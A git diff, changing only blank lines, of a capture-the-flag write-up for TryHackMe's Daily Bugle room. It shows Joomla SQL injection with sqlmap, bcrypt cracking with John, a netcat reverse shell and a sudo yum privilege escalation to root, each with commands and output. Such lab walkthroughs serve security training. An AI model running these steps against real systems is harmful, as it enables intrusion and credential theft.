@@ -27,7 +27,6 @@ Room Link: [https://tryhackme.com/room/dailybugle](https://tryhackme.com/room/da
 - Running nmap gives some ports.
 
 ```bash
-
 nmap -A 10.10.250.153
 Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-05 11:33 IST
 Nmap scan report for 10.10.250.153
@@ -59,7 +58,6 @@ Command used: `joomscan  -u http://10.10.250.153/`
 - Using SearchSploit by exploitDB gives us SQL injection exploits on this joomla CMS version.
 
 ```bash
-
 searchsploit joomla 3.7.0
 ---------------------------------------------- ---------------------------------
  Exploit Title                                |  Path
@@ -80,7 +78,6 @@ At first we crafted a command to begin SQL injection `sqlmap -u "http://10.10.25
 It shows result like that,
 
 ```bash
-
 +-----+------------+----------+---------------------+--------------------------------------------------------------+
 | id  | name       | username | email               | password                                                     |
 +-----+------------+----------+---------------------+--------------------------------------------------------------+
@@ -91,7 +88,6 @@ It shows result like that,
 - We used `hashid` to detect hash type and it could be `bcrypt`.
 
 ```bash
-
 hashid '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
 Analyzing '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
 [+] Blowfish(OpenBSD) 
@@ -102,7 +98,6 @@ Analyzing '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
 - Now we can use `john the ripper` to decrypt the hash, using `rockyou.txt` wordlist.
 
 ```bash
-
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
 Using default input encoding: UTF-8
 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
@@ -122,7 +117,6 @@ Session completed.
 - Opening http://10.10.250.153/templates/beez3/index.php will give shell.
 
 ```bash
-
 nc -nlvp 1234
 Listening on 0.0.0.0 1234
 Connection received on 10.10.250.153 56764
@@ -152,7 +146,6 @@ Last login: Tue Mar  5 04:27:31 2024
 - Using `sudo -l` command shows `/usr/bin/yum`.
 
 ```bash
-
 sudo -l
 Matching Defaults entries for jjameson on dailybugle:
     !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
@@ -171,7 +164,6 @@ User jjameson may run the following commands on dailybugle:
 - Just copy pasting given commands in `b` will upgrade ssh to `root`
 
 ```bash
-
 TF=$(mktemp -d)
 cat >$TF/x<<EOF
 [main]
@@ -200,7 +192,6 @@ sudo yum -c $TF/x --enableplugin=y
 - So typing `cat /root/root.txt` will give us root flag.
 
 ```bash
-
 sh-4.2# id
 uid=0(root) gid=0(root) groups=0(root)
 sh-4.2# cat /root/root.txt
